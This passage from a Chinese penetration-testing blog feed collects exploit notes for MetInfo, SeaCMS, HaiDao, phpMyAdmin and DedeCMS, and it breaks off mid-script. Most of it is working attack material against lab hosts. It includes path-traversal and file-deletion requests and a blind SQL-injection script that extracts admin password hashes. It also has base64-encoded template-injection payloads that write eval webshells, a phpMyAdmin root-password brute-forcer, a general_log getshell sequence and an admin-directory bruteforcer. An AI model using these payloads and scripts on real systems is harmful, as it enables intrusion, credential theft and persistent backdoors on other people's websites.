target="_blank" rel="noopener">https://paper.tuisec.win/detail/89cd63e5894ee07</a><br>poc尝试:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?dir=.....///http/.....///config/config_db.php</span><br><span class="line">?dir=http/.....///.....///config/config_db.php</span><br><span class="line">?dir=http\..\..\config\config_db.php</span><br></pre></td></tr></table></figure></p><p>最终poc:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.1.201/metinfo6/include/thumb.php?dir=http\..\..\config\config_db.php?dir=http\..\..\config\config_db.php</span><br></pre></td></tr></table></figure></p><p><img src="/posts/../../images/cms/metinfo9.png" alt=""></p><h1 id="Metinfo-6-0-0任意文件删除"><a href="#Metinfo-6-0-0任意文件删除" class="headerlink" title="Metinfo 6.0.0任意文件删除"></a>Metinfo 6.0.0任意文件删除</h1><p>poc:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.0.6/metinfo6/admin/app/batch/csvup.php?fileField=<span class="built_in">test</span>-1&amp;flienamecsv=../../../config/1.rar</span><br></pre></td></tr></table></figure></p><p>metinfo5.31测试也行。试图删除<code>install.lock</code> 失败</p><h1 id="Metinfo-v6-0-0-getshell-in-background"><a href="#Metinfo-v6-0-0-getshell-in-background" class="headerlink" title="Metinfo v6.0.0 getshell in background"></a>Metinfo v6.0.0 getshell in background</h1><p>文章中说可以成功，但在实践中发现<code>$module = intval($module);</code> 在6.0.0中多了intval取整，写入的一句话，被过滤掉了，导致写入失败，。   在5.3.1测试成功，其他版本自测。<br><a href="https://www.kingkk.com/2018/06/Metinfo-v6-0-0-getshell-in-background/" target="_blank" rel="noopener">https://www.kingkk.com/2018/06/Metinfo-v6-0-0-getshell-in-background/</a><br>poc:<br>登入后台，访问</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.1.201/metinfo531/admin/column/save.php?</span><br><span class="line">name=123</span><br><span class="line">&amp;action=editor</span><br><span class="line">&amp;foldername=upload</span><br><span class="line">&amp;module=22;@<span class="built_in">eval</span>(<span class="variable">$_POST</span>[yesi]);/*</span><br></pre></td></tr></table></figure><p>可在/upload/index.php中写入<code>@eval($_POST[yesi]);</code><br><img src="/posts/../../images/cms/metinfo10.png" alt=""></p><h1 id="代码审计-MetInfo6-0-0漏洞集合（一）"><a href="#代码审计-MetInfo6-0-0漏洞集合（一）" class="headerlink" title="[代码审计] MetInfo6.0.0漏洞集合（一）"></a>[代码审计] MetInfo6.0.0漏洞集合（一）</h1><p><a href="https://bbs.ichunqiu.com/thread-43416-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-43416-1-1.html</a></p><h2 id="ox01后台sql注入"><a href="#ox01后台sql注入" class="headerlink" title="ox01后台sql注入"></a>ox01后台sql注入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"192.168.1.201/metinfo6/admin/index.php?lang=cn&amp;anyid=&amp;n=feedback&amp;c=feedback_admin&amp;a=doexport&amp;class1=&amp;met_fd_export=-1&amp;check_id=1"</span> --cookie <span class="string">"cookie"</span> -p check_id --dbms=mysql –-dbs</span><br></pre></td></tr></table></figure><p><img src="/posts/../../images/cms/metinfo11.png" alt=""></p><h1 id="Metinfo-6-1-2-SQL注入"><a href="#Metinfo-6-1-2-SQL注入" class="headerlink" title="Metinfo 6.1.2 SQL注入"></a>Metinfo 6.1.2 SQL注入</h1><p><a href="https://bbs.ichunqiu.com/thread-46687-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-46687-1-1.html</a><br>脚本中的sql根据情况而定。<br>poc:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2018-10-20 14:54:00</span></span><br><span class="line"><span class="comment"># @Author  : yeSi (you@example.org)</span></span><br><span class="line"><span class="comment"># @Link    : http://example.org</span></span><br><span class="line"><span class="comment"># @Version : $Id$</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url=<span class="string">"http://192.168.0.6/metinfo612/admin/index.php?m=web&amp;n=message&amp;c=message&amp;a=domessage&amp;action=add&amp;lang=cn&amp;para137=1&amp;para186=1&amp;para138=1&amp;para139=1&amp;para140=1&amp;id=42 "</span></span><br><span class="line">chars=<span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ "</span></span><br><span class="line"><span class="built_in">test</span>=0</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(33):</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span>==1:</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">sql=<span class="string">"and ascii(substr((select group_concat(admin_id,admin_pass) from met_admin_table limit 0,1),&#123;0&#125;,1)) =&#123;1&#125;"</span>.format(i+1,ord(j))</span><br><span class="line"><span class="comment"># sql="and ascii(substr((select admin_id from met_admin_table limit 0,1),&#123;0&#125;,1)) =&#123;1&#125;".format(i+1,ord(j))</span></span><br><span class="line">payload=url+sql</span><br><span class="line">r=requests.get(payload)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'验证码错误'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">flag+=j</span><br><span class="line"><span class="built_in">print</span> flag</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">if</span> j==chars[-1]:</span><br><span class="line"><span class="built_in">test</span>=1</span><br><span class="line"><span class="built_in">print</span> <span class="string">'flag is :'</span>,flag</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="cms" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E/cms/"/>
    
    
      <category term="渗透测试" scheme="http://note.cfyqy.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞" scheme="http://note.cfyqy.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="cms" scheme="http://note.cfyqy.com/tags/cms/"/>
    
  </entry>
  
  <entry>
    <title>seacms</title>
    <link href="http://note.cfyqy.com/posts/7a7044d1.html"/>
    <id>http://note.cfyqy.com/posts/7a7044d1.html</id>
    <published>2018-10-16T13:55:00.000Z</published>
    <updated>2018-10-21T16:16:57.315Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="seacms6-45漏洞getshell"><a href="#seacms6-45漏洞getshell" class="headerlink" title="seacms6.45漏洞getshell"></a>seacms6.45漏洞getshell</h1><p><a href="https://blog.csdn.net/qq_35078631/article/details/76595817" target="_blank" rel="noopener">https://blog.csdn.net/qq_35078631/article/details/76595817</a><br>poc:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.0.6/seacms/search.php</span><br><span class="line"></span><br><span class="line">post: </span><br><span class="line">searchtype=5&amp;order=&#125;&#123;end <span class="keyword">if</span>&#125; &#123;<span class="keyword">if</span>:1)fputs(fopen(base64_decode(eWVzaTEucGhw),w),base64_decode(base64_decode(UEhOamNtbHdkQ0JzWVc1bmRXRm5aVDBpY0dod0lqNUFaWFpoYkNna1gxQlBVMVJiZVdWemFURmRLVHd2YzJOeWFYQjBQZz09)));<span class="keyword">if</span>(1&#125;&#123;end <span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure></p><p>在网站根目录创建yesi1.php文件   内容<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;@eval($_POST[yesi1])&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h1 id="海洋cms-v6-53-v6-54版本漏洞复现"><a href="#海洋cms-v6-53-v6-54版本漏洞复现" class="headerlink" title="海洋cms v6.53 v6.54版本漏洞复现"></a>海洋cms v6.53 v6.54版本漏洞复现</h1><p><a href="https://www.cnblogs.com/zhaijiahui/p/7648350.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaijiahui/p/7648350.html</a><br>菜刀(代码执行)函数和命令执行函数详解及Getshell方法<br><a href="https://www.cnblogs.com/fox-yu/p/9134848.html" target="_blank" rel="noopener">https://www.cnblogs.com/fox-yu/p/9134848.html</a><br>poc:<br>写入上传马（利用post传参，不能出现【&lt;】【&gt;】【+】【=】【/】等符号）</p><pre><code class="bash">192.168.0.6/seacms/search.phppost:searchtype=5&amp;searchword={<span class="keyword">if</span>{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=(<span class="variable">$_P</span>{searchpage:ver}&amp;&amp;ver=OST[9]))&amp;9[]=fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(base64_decode(UEQ5d2FIQWdEUXBBSkhSbGJYQWdQU0FrWDBaSlRFVlRXeWQxY0d4dllXUmZabWxzWlNkZFd5ZDBiWEJmYm1GdFpTZGRPdzBLUUNSbWFXeGxJRDBnWW1GelpXNWhiV1VvSkY5R1NVeEZVMXNuZFhCc2IyRmtYMlpwYkdVblhWc25ibUZ0WlNkZEtUc05DbWxtSUNobGJYQjBlU0FvSkdacGJHVXBLWHNOQ21WamFHOGdJanhtYjNKdElHRmpkR2x2YmlBOUlDY25JRzFsZEdodlpDQTlJQ2RRVDFOVUp5QkZUa05VV1ZCRlBTZHRkV3gwYVhCaGNuUXZabTl5YlMxa1lYUmhKejVjYmlJN1pXTm9ieUFpVEc5allXd2dabWxzWlRvZ1BHbHVjSFYwSUhSNWNHVWdQU0FuWm1sc1pTY2dibUZ0WlNBOUlDZDFjR3h2WVdSZlptbHNaU2MrWEc0aU8yVmphRzhnSWp4cGJuQjFkQ0IwZVhCbElEMGdKM04xWW0xcGRDY2dkbUZzZFdVZ1BTQW5WWEJzYjJGa0p6NWNiaUk3WldOb2J5QWlQQzltYjNKdFBseHVQSEJ5WlQ1Y2JseHVQQzl3Y21VK0lqdDlaV3h6WlNCN2FXWW9iVzkyWlY5MWNHeHZZV1JsWkY5bWFXeGxLQ1IwWlcxd0xDUm1hV3hsS1NsN1pXTm9ieUFpUm1sc1pTQjFjR3h2WVdSbFpDQnpkV05qWlhOelpuVnNiSGt1UEhBK1hHNGlPMzFsYkhObElIdGxZMmh2SUNKVmJtRmliR1VnZEc4Z2RYQnNiMkZrSUNJZ0xpQWtabWxzWlNBdUlDSXVQSEErWEc0aU8zMTlQejQ9)));</code></pre><p>上传一句话<br><img src="/posts/../../images/cms/seacm1.png" alt=""></p><h1 id="seacms-6-55-代码注入漏洞"><a href="#seacms-6-55-代码注入漏洞" class="headerlink" title="seacms 6.55 代码注入漏洞"></a>seacms 6.55 代码注入漏洞</h1><p><a href="https://github.com/SukaraLin/php_code_audit_project/blob/master/seacms/seacms%206.55%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md" target="_blank" rel="noopener">https://github.com/SukaraLin/php_code_audit_project/blob/master/seacms/seacms%206.55%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md</a>  </p><p>poc</p><pre><code class="bash">http://192.168.0.6/upload/search.php?fputs(fopen(base64_decode(eWVzaTEucGhw),w),base64_decode(base64_decode(UEhOamNtbHdkQ0JzWVc1bmRXRm5aVDBpY0dod0lqNUFaWFpoYkNna1gxQlBVMVJiZVdWemFURmRLVHd2YzJOeWFYQjBQZz09)));post:searchtype=5&amp;searchword={<span class="keyword">if</span>{searchpage:year}&amp;year=:as{searchpage:area}}&amp;area=s{searchpage:letter}&amp;letter=ert{searchpage:lang}&amp;yuyan=(<span class="variable">$_SE</span>{searchpage:jq}&amp;jq=RVER{searchpage:ver}&amp;&amp;ver=[QUERY_STRING]));/*</code></pre><h1 id="seacms-6-6-1"><a href="#seacms-6-6-1" class="headerlink" title="seacms 6.6.1"></a>seacms 6.6.1</h1><h2 id="seamcms-6-6-1后台getshell"><a href="#seamcms-6-6-1后台getshell" class="headerlink" title="seamcms 6.6.1后台getshell"></a>seamcms 6.6.1后台getshell</h2><p><a href="https://github.com/SecWiki/CMS-Hunter/blob/master/seacms/seacms6.61/seacms.md" target="_blank" rel="noopener">https://github.com/SecWiki/CMS-Hunter/blob/master/seacms/seacms6.61/seacms.md</a></p><h2 id="seamcms-6-6-1后台-xss存储"><a href="#seamcms-6-6-1后台-xss存储" class="headerlink" title="seamcms 6.6.1后台 xss存储"></a>seamcms 6.6.1后台 xss存储</h2><p><a href="https://github.com/SecWiki/CMS-Hunter/blob/master/seacms/seacms6.61/seacms661.md" target="_blank" rel="noopener">https://github.com/SecWiki/CMS-Hunter/blob/master/seacms/seacms6.61/seacms661.md</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="cms" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E/cms/"/>
    
    
      <category term="渗透测试" scheme="http://note.cfyqy.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞" scheme="http://note.cfyqy.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="cms" scheme="http://note.cfyqy.com/tags/cms/"/>
    
  </entry>
  
  <entry>
    <title>海盗云商</title>
    <link href="http://note.cfyqy.com/posts/79704id1.html"/>
    <id>http://note.cfyqy.com/posts/79704id1.html</id>
    <published>2018-10-14T04:19:00.000Z</published>
    <updated>2018-10-21T16:17:59.220Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>海盗云商前台getshell,前台会员头像%00截断<br>版本2.0.15<br>php版本小于5.3.4 详情关注CVE-2006-7243<br>php的magic_quotes_gpc为OFF状态<br><a href="http://www.5kik.com/php0day/424.html" target="_blank" rel="noopener">http://www.5kik.com/php0day/424.html</a></p><p><img src="/posts/../../images/cms/haidao1.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="cms" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E/cms/"/>
    
    
      <category term="渗透测试" scheme="http://note.cfyqy.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞" scheme="http://note.cfyqy.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="cms" scheme="http://note.cfyqy.com/tags/cms/"/>
    
  </entry>
  
  <entry>
    <title>phpmyadmin</title>
    <link href="http://note.cfyqy.com/posts/15329.html"/>
    <id>http://note.cfyqy.com/posts/15329.html</id>
    <published>2018-10-14T02:21:00.000Z</published>
    <updated>2018-11-02T13:22:26.938Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="phpMyAdmin-4-7-x-CSRF-漏洞利用"><a href="#phpMyAdmin-4-7-x-CSRF-漏洞利用" class="headerlink" title="phpMyAdmin 4.7.x CSRF 漏洞利用"></a>phpMyAdmin 4.7.x CSRF 漏洞利用</h1><p><a href="https://xz.aliyun.com/t/2384" target="_blank" rel="noopener">https://xz.aliyun.com/t/2384</a></p><h1 id="phpmyadmin登陆爆破-py"><a href="#phpmyadmin登陆爆破-py" class="headerlink" title="phpmyadmin登陆爆破.py"></a>phpmyadmin登陆爆破.py</h1><p><a href="https://paper.tuisec.win/detail/686fd5f60e469d2" target="_blank" rel="noopener">https://paper.tuisec.win/detail/686fd5f60e469d2</a>  </p><p>思路可参考，代码根据版本修改，有token就没办法爆破。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: IcySun</span></span><br><span class="line"><span class="comment"># 脚本功能：暴力破解phpMyadmin密码</span></span><br><span class="line">from Queue import Queue</span><br><span class="line">import threading,sys</span><br><span class="line">import requests</span><br><span class="line">def use():</span><br><span class="line">    <span class="built_in">print</span> <span class="string">'#'</span> * 50</span><br><span class="line">    <span class="built_in">print</span> <span class="string">'\t Crack Phpmyadmin root\'</span>s pass<span class="string">'</span></span><br><span class="line"><span class="string">    print '</span>\t\t\t Code By: IcySun<span class="string">'</span></span><br><span class="line"><span class="string">    print '</span>\t python crackPhpmyadmin.py http://xx.com/phpmyadmin/ \n\t    (default user is root)<span class="string">'</span></span><br><span class="line"><span class="string">    print '</span><span class="comment">#' * 50</span></span><br><span class="line">def crack(password):</span><br><span class="line">    global url</span><br><span class="line">    payload = &#123;<span class="string">'pma_username'</span>: <span class="string">'root'</span>, <span class="string">'pma_password'</span>: password&#125;</span><br><span class="line">    headers = &#123;<span class="string">'User-Agent'</span> : <span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64)'</span>&#125;</span><br><span class="line">    r = requests.post(url, headers = headers, data = payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'name="login_form"'</span> not <span class="keyword">in</span> r.content:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">'[*] OK! Have Got The Pass ==&gt; %s'</span> % password</span><br><span class="line">class MyThread(threading.Thread):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">    def run(self):</span><br><span class="line">        global queue</span><br><span class="line">        <span class="keyword">while</span> not queue.empty():</span><br><span class="line">            password = queue.get()</span><br><span class="line">            crack(password)</span><br><span class="line">def main():</span><br><span class="line">    global url,password,queue</span><br><span class="line">    queue = Queue()</span><br><span class="line">    url = sys.argv[1]</span><br><span class="line">    passlist = open(<span class="string">'password.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">    <span class="keyword">for</span> password <span class="keyword">in</span> passlist.readlines():</span><br><span class="line">        password = password.strip()</span><br><span class="line">        queue.put(password)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(10):</span><br><span class="line">        c = MyThread()</span><br><span class="line">        c.start()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != 2 :</span><br><span class="line">        use()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        main()</span><br></pre></td></tr></table></figure><h1 id="phpmyadmin4-8-1后台getshell"><a href="#phpmyadmin4-8-1后台getshell" class="headerlink" title="phpmyadmin4.8.1后台getshell"></a>phpmyadmin4.8.1后台getshell</h1><p><a href="https://xz.aliyun.com/t/2399" target="_blank" rel="noopener">https://xz.aliyun.com/t/2399</a><br>文件包含<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.0.37/phpmyadmin481/index.php?target=db_sql.php%253f/../../../../../../etc/passwd</span><br></pre></td></tr></table></figure></p><p><img src="/posts/../../images/cms/phpmyadmin1.png" alt=""></p><p>poc:<br>创建一个表，字段名为一句话<br><img src="/posts/../../images/cms/phpmyadmin5.png" alt=""></p><p>找到对应的数据库文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select variables like <span class="string">"%char%"</span>;</span><br></pre></td></tr></table></figure></p><p><img src="/posts/../../images/cms/phpmyadmin2.png" alt=""><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select @@datadir;</span><br></pre></td></tr></table></figure></p><p><img src="/posts/../../images/cms/phpmyadmin3.png" alt=""></p><p>文件包含表文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.0.37/phpmyadmin481/index.php?target=db_sql.php%253f/../../../../../../var/lib/mysql/<span class="built_in">test</span>/yesi.frm</span><br></pre></td></tr></table></figure></p><p><img src="/posts/../../images/cms/phpmyadmin4.png" alt=""></p><p>思路很精妙。如果目标在linux下，因为/var/lib/mysql的权限为700，会包含失败。window没有限制。<br>试一试以下的方法   </p><h1 id="通过-phpmyadmin-getshell"><a href="#通过-phpmyadmin-getshell" class="headerlink" title="通过 phpmyadmin getshell"></a>通过 phpmyadmin getshell</h1><p><a href="https://www.cnblogs.com/Oran9e/p/8873091.html" target="_blank" rel="noopener">https://www.cnblogs.com/Oran9e/p/8873091.html</a><br><a href="https://bbs.ichunqiu.com/thread-41091-1-1.html?from=snew" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-41091-1-1.html?from=snew</a><br>general_log默认为关闭的，root权限开启后，general_log_file会保存所有的查询语句<br>可以开启general_log，然后设置general_log_file为一个php文件，最后用一句话木马进行查询来获取shell<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">show variables like <span class="string">'%general%'</span>;</span><br></pre></td></tr></table></figure></p><p><img src="/posts/../../images/cms/phpmyadmin8.png" alt=""><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SET GLOBAL general_log = ON;</span><br></pre></td></tr></table></figure></p><p><img src="/posts/../../images/cms/phpmyadmin7.png" alt=""><br>开启成功</p><p>然后把general_log_file设置为shell的绝对路径<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SET global general_log_file=<span class="string">'/var/www/html/yesi.php'</span>;</span><br></pre></td></tr></table></figure></p><p>然后执行SQL查询语句，写个一句话进去。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELECT <span class="string">'&lt;?php @eval($_POST["orange"]);?&gt;'</span>;</span><br></pre></td></tr></table></figure><p>访问yesi.php 即可得到一句话。</p><p>into outfile限制<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &apos;%secure%&apos;;</span><br></pre></td></tr></table></figure></p><p><img src="/posts/../../images/cms/phpmyadmin9.png" alt=""><br>secure_file_priv 为 NULL 时，表示限制mysqld不允许导入或导出。<br>secure_file_priv 为 /tmp 时，表示限制mysqld只能在/tmp目录中执行导入导出，其他目录不能执行。<br>secure_file_priv 没有值时，表示不限制mysqld在任意目录的导入导出。<br>因为 secure_file_priv 参数是只读参数，不能使用set global命令修改。<br>解决方法：<br>打开my.cnf 或 my.ini，加入以下语句后重启mysql。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">secure_file_priv=<span class="string">''</span>  </span><br><span class="line"></span><br><span class="line">/etc/init.d/mysql restart</span><br></pre></td></tr></table></figure></p><p>MySQL配置文件my.ini或my.cnf的位置<br>1、Windows下MySQL的配置文件是my.ini，一般会在安装目录的根目录。   </p><p>2、Linux下MySQL的配置文件是my.cnf，一般会放在/etc/my.cnf，/etc/mysql/my.cnf。如果找不到，可以用find命令查找。  </p><p>phpMyAdmin<br>4.0.1 – 4.0.10.6<br>4.1.1 – 4.1.14.7<br>4.2.1 – 4.2.12<br>任意文件包含漏洞:<a href="http://www.91ri.org/11575.html" target="_blank" rel="noopener">http://www.91ri.org/11575.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="cms" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E/cms/"/>
    
    
      <category term="渗透测试" scheme="http://note.cfyqy.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞" scheme="http://note.cfyqy.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="cms" scheme="http://note.cfyqy.com/tags/cms/"/>
    
  </entry>
  
  <entry>
    <title>dedecms</title>
    <link href="http://note.cfyqy.com/posts/797044da.html"/>
    <id>http://note.cfyqy.com/posts/797044da.html</id>
    <published>2018-10-10T13:34:00.000Z</published>
    <updated>2018-10-21T16:16:41.610Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="解决DEDECMS历史难题–找后台目录"><a href="#解决DEDECMS历史难题–找后台目录" class="headerlink" title="解决DEDECMS历史难题–找后台目录"></a>解决DEDECMS历史难题–找后台目录</h1><p><a href="https://xz.aliyun.com/t/2064" target="_blank" rel="noopener">https://xz.aliyun.com/t/2064</a><br>py脚本：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2018-10-17 18:57:00</span></span><br><span class="line"><span class="comment"># @Author  : Your Name (you@example.org)</span></span><br><span class="line"><span class="comment"># @Link    : http://example.org</span></span><br><span class="line"><span class="comment"># @Version : $Id$</span></span><br><span class="line">import sys  </span><br><span class="line">reload(sys)  </span><br><span class="line">sys.setdefaultencoding(<span class="string">'utf8'</span>)  </span><br><span class="line">import requests</span><br><span class="line">import itertools</span><br><span class="line">characters= <span class="string">"bacdefghijklmnopqrstuvwxyz0123456789_!#"</span></span><br><span class="line">back_dir=<span class="string">""</span></span><br><span class="line">flag=0</span><br><span class="line">url=<span class="string">"http://192.168.0.6/uploads/tags.php"</span></span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">"_FILES[mochazz][tmp_name]"</span>:<span class="string">"./&#123;p&#125;&lt;&lt;/images/adminico.gif"</span>,</span><br><span class="line"><span class="string">"_FILES[mochazz][name]"</span>:0,</span><br><span class="line"><span class="string">"_FILES[mochazz][size]"</span>:0,</span><br><span class="line"><span class="string">"_FILES[mochazz][type]"</span>:<span class="string">"image/gif"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(1,7):</span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">for</span> pre <span class="keyword">in</span> itertools.permutations(characters,num):</span><br><span class="line">pre=<span class="string">''</span>.join(list(pre))</span><br><span class="line">data[<span class="string">"_FILES[mochazz][tmp_name]"</span>] = data[<span class="string">"_FILES[mochazz][tmp_name]"</span>].format(p=pre)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"test"</span>,pre</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"Upload filetype not allow"</span> not <span class="keyword">in</span> r.text and r.status_code==200:</span><br><span class="line">flag=1</span><br><span class="line">back_dir=pre</span><br><span class="line">data[<span class="string">"_FIES[mochazz][tmp_name]"</span>]=<span class="string">'./&#123;p&#125;&lt;&lt;/images/adminico.gif'</span></span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">data[<span class="string">"_FILES[mochazz][tmp_name]"</span>]=<span class="string">"./&#123;p&#125;&lt;&lt;/images/adminico.gif"</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">"[+]前缀为:"</span>,back_dir</span><br><span class="line">flag=0</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(30):</span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span 